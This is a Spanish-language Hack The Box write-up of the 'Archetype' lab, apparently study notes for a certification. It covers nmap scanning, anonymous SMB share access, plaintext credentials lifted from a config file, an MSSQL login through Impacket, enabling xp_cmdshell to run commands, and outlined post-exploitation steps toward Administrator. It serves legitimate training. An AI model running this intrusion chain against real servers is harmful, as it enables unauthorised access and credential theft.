# HTB — **Archetype (Starting Point)**

**Fase cubierta:** Recopilación de información (recon), enumeración y preparación de acceso  
**Entorno:** Kali Linux (Slimbook), conexión **OpenVPN** a **HTB Starting Point (EU)**

> En este lab vamos a: identificar servicios abiertos, enumerar **SMB** y **MSSQL**, extraer credenciales de un share, y dejar preparado el acceso autenticado a SQL Server. El write-up oficial sugiere exactamente este flujo: **Nmap → SMB → `prod.dtsConfig` → `mssqlclient.py` → `xp_cmdshell` → (post-explotación con `winPEAS` y obtención de credenciales admin en `ConsoleHost_history.txt`)**.

---

## 0) Conectividad HTB (VPN)

**Objetivo:** confirmar que estamos dentro de la red de Starting Point y que la máquina objetivo es alcanzable.

- **Interfaz VPN activa:**

 ```bash
ip a | sed -n '/tun0/,+5p'
# inet 10.10.14.144/23 dev tun0   ← IP interna HTB
```

- **IP de la máquina (dinámica en SP):**

```
 10.129.79.39
```

- **Nota:** en HTB muchas máquinas **no responden a ping**. Valida vida con `nmap -Pn` a puertos concretos.

---

## 1) **Escaneo de red** (Nmap)

### 1.1 Comando final correcto (con salida a fichero)

> En el write-up se usa `nmap -sC -sV {TARGET_IP}` como base. Aquí añadimos SYN scan y guardamos en fichero.

```bash
nmap -sS -sC -sV -oN nmap_archetype 10.129.79.39
```

### 1.2 Resultado (tu salida real, resumen)

```text
Host is up (0.062s latency).
Not shown: 995 closed tcp ports (reset)
PORT     STATE SERVICE      VERSION
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds Windows Server 2019 Standard 17763
1433/tcp open  ms-sql-s     Microsoft SQL Server 2017 14.00.1000.00 (RTM)
5985/tcp open  http         Microsoft HTTPAPI httpd 2.0
```

**Scripts NSE destacados (de tu escaneo):**

- `smb-os-discovery` → **Windows Server 2019 Standard**, hostname `Archetype`.
    
- `ms-sql-info` → **MSSQL 2017 RTM (14.00.1000.00)** en `1433/tcp`.
    
- `smb2-security-mode` → _Message signing enabled but not required_.
    
- `smb-enum-shares` (cuando lo ejecutaste aparte) → **share `backups`** accesible en lectura.
    
    > El write-up confirma la presencia de SMB + MSSQL y el flujo de enumeración de shares con `smbclient`.
    

---

## 2) **Enumeración SMB** (shares y extracción de config)

### 2.1 Listar shares

> El write-up recomienda `smbclient -N -L \\\\{TARGET_IP}\\`.

```bash
smbclient -L 10.129.79.39 -N

# (tu salida previa mostró)
Sharename       Type    Comment
---------       ----    -------
ADMIN$          Disk    Remote Admin
C$              Disk    Default share
IPC$            IPC     Remote IPC
backups         Disk
```

- **Non-Administrative share**: `backups` (los admin por defecto suelen ser `ADMIN$`, `C$`, `IPC$`).
    

### 2.2 Acceso y descarga del fichero interesante

```bash
smbclient //10.129.79.39/backups -N
smb: \> ls
  prod.dtsConfig   AR   609  Mon Jan 20 13:23:02 2020

smb: \> get prod.dtsConfig
```

> El write-up identifica **`prod.dtsConfig`** como archivo de configuración que contiene credenciales en claro.

### 2.3 Análisis local del archivo

```bash
file prod.dtsConfig
# ASCII text, with CRLF line terminators

cat prod.dtsConfig
# ... Password=M3g4c0rp123; User ID=ARCHETYPE\sql_svc; ...
```

**Hallazgo:** credenciales **Windows Auth** para MSSQL:

- Usuario: `ARCHETYPE\sql_svc`
- Password: `M3g4c0rp123`

> El write-up lo confirma y propone usar **Impacket** → `mssqlclient.py` para autenticarse al servidor MSSQL.

---

## 3) **Preparar acceso autenticado a MSSQL** (teoría + comandos listos)

> La guía oficial detalla instalación/uso de Impacket y el script **`mssqlclient.py`**.

- **Conexión:**
```bash
mssqlclient.py ARCHETYPE/sql_svc@10.129.79.39 -windows-auth
```

- **Habilitar `xp_cmdshell` (si está deshabilitado):**
###  Secuencia correcta para habilitar `xp_cmdshell`

Es importante ejecutar **cada línea completa y cerrada**, y terminar las instrucciones con `;`.  
Aquí tienes el bloque exacto:

`EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;`

#### 🔹 Paso de validación

Una vez habilitado, prueba con algo sencillo como:

`EXEC xp_cmdshell 'whoami';`

👉 Deberías ver en la salida algo tipo:

`ARCHETYPE\sql_svc`

---

#### 🔹 Tips dentro de `mssqlclient.py`

- Si te lías, recuerda que **`mssqlclient.py` no es un PowerShell**, es un **prompt SQL**.
- **Cada comando debe estar completo en una sola línea**.
- Si recibes un error como _“Unclosed quotation mark”_, revisa que has cerrado `' '` correctamente.
---

## 4) (Referencia) Post-explotación sugerida por el write-up

> A efectos de **recopilación/planificación**, dejamos constancia de lo que viene después, para que tu ficha quede completa de cara al eJPT:

- **Enumeración de privilegios y rutas de escalada con `winPEAS`**.
    
- **Fichero clave con historial de PowerShell**:  
    `C:\Users\<user>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\**ConsoleHost_history.txt**`  
    → El write-up indica que ahí se obtiene **la contraseña del usuario Administrator** en claro.
    
- **Acceso final como Administrator** con `psexec.py`.
    

---

## 5) **Problemas encontrados & soluciones**

- **Nmap flags inválidas**:  
    Intentos como `-soVNC` o mezclar `-oN` mal posicionado → **solución**: `nmap -sS -sC -sV -oN <file> <IP>`.
    
- **Ping no responde**:  
    En HTB es normal → **solución**: usar `nmap -Pn` y comprobar puertos concretos (p.ej. `445,1433`).
    
- **`smbclient -H`**:  
    `-H` no existe → **solución**: `smbclient -L <IP> -N` para listar; `smbclient //<IP>/<share> -N` para conectar.
    
- **Comandos Linux dentro de `smbclient`** (`cat`, `file`, `whoami`) → no existen en el prompt SMB.  
    **Solución**: `get` y analizar el fichero localmente (`cat`, `file` en tu shell).
    
- **Confusión de credenciales**:  
    `prod.dtsConfig` contiene **credenciales de `sql_svc`**, **no** la contraseña del Administrador.  
    La **contraseña de Administrator** se obtiene (según write-up) en `ConsoleHost_history.txt` durante la post-explotación.
    

---

## 6) **Checklist de Recopilación** (plantilla)

```markdown
### Archetype · Recon & Enumeración

- [ ] VPN conectada (tun0 10.10.x.x) y ruta a 10.129.0.0/16
- [ ] Vida sin ICMP → `nmap -Pn -p 445,1433 {{IP}}`
- [ ] Escaneo base → `nmap -sS -sC -sV -oN nmap_{{host}} {{IP}}`
- [ ] Servicios identificados:
      - 445/tcp SMB (Windows Server 2019)
      - 1433/tcp MSSQL 2017 RTM
- [ ] Enumeración SMB:
      - `smbclient -L {{IP}} -N` → detectar non-admin share
      - `smbclient //{{IP}}/backups -N` → `get prod.dtsConfig`
- [ ] Extraer credenciales de `prod.dtsConfig` (si existen)
- [ ] (Opcional) Validar login MSSQL → `mssqlclient.py DOMAIN/user@{{IP}} -windows-auth`
```

---

## 7) **Chuletas útiles**

- **SMB (`smbclient`)**
    
    ```bash
    smbclient -L <IP> -N                   # listar shares
    smbclient //<IP>/<SHARE> -N            # conectar anónimo
    smbclient //<IP>/<SHARE> -U <user>     # conectar con usuario
    # dentro del prompt:
    # ls, cd <dir>, get <file>, put <file>, exit
    ```
    
- **MSSQL (Impacket)**
    
    ```bash
    mssqlclient.py <DOMAIN>/<USER>@<IP> -windows-auth
    -- En SQL:
    EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
    EXEC sp_configure 'xp_cmdshell', 1;        RECONFIGURE;
    EXEC xp_cmdshell 'whoami';
    ```
    
- **Nmap rápido por servicio**
    
    ```bash
    nmap -Pn -p 445,139 <IP>     # SMB
    nmap -Pn -p 1433 <IP>        # MSSQL
    nmap -p445 --script smb-enum-shares <IP>
    ```
    

---

## 8) **Preguntas del lab** (con _spoilers_ colapsados)

> Las respuestas están justificadas por tu práctica y/o por el write-up oficial.

**Task 1 — Which TCP port is hosting a database server?**

**Task 2 — What is the name of the non-Administrative share available over SMB?**

**Task 3 — What is the password identified in the file on the SMB share?**

**Task 4 — What script from Impacket can establish an authenticated connection to MSSQL?**

**Task 5 — What extended stored procedure can spawn a Windows command shell?**

**Task 6 — What script can search possible paths to escalate privileges on Windows?**

**Task 7 — What file contains the administrator's password?**

**Submit User Flag / Submit Root Flag**

- **User**: tras foothold (shell como `sql_svc`), suele estar en `C:\Users\sql_svc\Desktop\user.txt`.
    
- **Root/Admin**: tras PrivEsc (Administrator), `C:\Users\Administrator\Desktop\root.txt`.  
    _(Entrega en la UI de HTB.)_
    

---

## 9) Referencias (write-up oficial)

- Enumeración base, SMB y `prod.dtsConfig`, uso de **Impacket `mssqlclient.py`**.
    
- Conexión a MSSQL, activación de **`xp_cmdshell`** y ejecución de comandos.
    
- Post-explotación con **`winPEAS`**, hallazgo de credenciales admin en **`ConsoleHost_history.txt`**, y **`psexec.py`**.
    

---